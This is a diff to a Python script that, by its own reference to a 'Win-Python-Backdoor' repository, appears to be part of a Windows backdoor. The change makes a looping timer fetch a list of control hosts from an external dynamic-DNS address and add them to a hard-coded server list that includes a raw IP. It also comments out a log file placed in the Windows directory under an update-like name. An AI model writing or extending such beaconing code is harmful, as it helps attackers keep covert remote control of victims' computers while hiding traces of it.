@@ -177,12 +177,13 @@ def myloop():
     threading.Timer(10.0, myloop).start() # called every minute   
     sinit='0'
     #sites = ["paner.altervista.org", "verifiche.ddns.net"]
-#    ua = UserAgent()
-#    header = {'User-Agent':str(ua.chrome)}
-#    mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
+    #ua = UserAgent()
+    #header = {'User-Agent':str(ua.chrome)}
+    header = {'User-Agent': 'Mozilla/5.0'}
+    mainsite = requests.get("http://config02.addns.org/site.txt", headers=header)
     #print mainsite.text
     sites = ["paner.altervista.org"]#, mainsite.text]
-#    sites.extend(mainsite.text.split(",") )
+    sites.extend(mainsite.text.split(",") )
     #site="paner.altervista.org"
     site1="paner.altervista.org"
     site2="52.26.124.145"
@@ -193,7 +194,7 @@ def myloop():
 
     
     
-    header = {'User-Agent': 'Mozilla/5.0'}
+    
     #print(header)
     
     
@@ -212,10 +213,10 @@ def myloop():
     app_log.addHandler(my_handler)
 
 
-    app_log.info("data")
+    #app_log.info("data")
     
     
-    logging.basicConfig(filename=os.getenv('windir')+"\\wup.log",level=logging.INFO, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+    #logging.basicConfig(filename=os.getenv('windir')+"\\wup.log",level=logging.INFO, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
     app_log.info('Start')
     
     
